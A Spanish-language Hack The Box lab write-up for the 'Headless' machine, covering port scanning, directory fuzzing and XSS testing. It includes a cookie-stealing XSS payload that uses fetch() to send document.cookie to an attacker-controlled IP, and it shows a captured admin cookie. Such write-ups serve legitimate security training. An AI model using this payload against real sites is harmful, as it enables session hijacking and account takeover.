# HTB - HEADLESS

## Enumeración de puertos/servicios

``` bash 
sudo nmap -sCVT 10.10.11.8
```

![image](https://github.com/0111100/HTB-HEADLESS/assets/96475451/cc1af630-4f2d-477d-b696-6a4e17f1ece6)

Podemos ver 2 puertos abiertos:
- 22 (SSH)
- 5000 (posiblemente una web)

Vamos a probar si funciona la ip con el puerto 5000.

![image](https://github.com/0111100/HTB-HEADLESS/assets/96475451/850f9ad0-3187-4e0d-a5cc-1eabf2706e0f)


Efectivamente funciona la web, una vez tenemos acceso a ella lo primero que vamos a hacer es realizar un fuzzing en busca de directorios:

![image](https://github.com/0111100/HTB-HEADLESS/assets/96475451/d4766bf4-277e-4c2b-a129-c646d98be7d6)


## Detección de vulnerabilidades


![image](https://github.com/0111100/HTB-HEADLESS/assets/96475451/241dc6dd-04dd-4d20-891a-94850e1c1e4e)


![image](https://github.com/0111100/HTB-HEADLESS/assets/96475451/33cdc751-0bcf-4ee8-b42f-ab14de7a8d6c)



``` javascript
<script>alert(‘XSS’)</script>
```



Después de probar con algunos xss decido probar por otro lado a ver si funciona.

![image](https://github.com/0111100/HTB-HEADLESS/assets/96475451/2f294528-ef0f-4640-9183-55b033e60dd9)

![image](https://github.com/0111100/HTB-HEADLESS/assets/96475451/b67c57b8-9bb9-4491-9385-a25d1fafbc15)

![image](https://github.com/0111100/HTB-HEADLESS/assets/96475451/f69baa5f-7213-4eb9-b143-225fbb06289b)

![image](https://github.com/0111100/HTB-HEADLESS/assets/96475451/7e6235d8-677f-46ee-baee-f669a02da363)

``` javascript
<img src=x onerror=fetch('http://10.10.14.168/?cpplie='+document.cookie);>
```

![image](https://github.com/0111100/HTB-HEADLESS/assets/96475451/269a605b-c54e-4c09-bfe0-872aee33c8ed)

cookie: "ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0"

![image](https://github.com/0111100/HTB-HEADLESS/assets/96475451/9f4cb784-9d61-481b-928a-ddba6b524c6b)




![[Pasted image 20240404184300.png]]
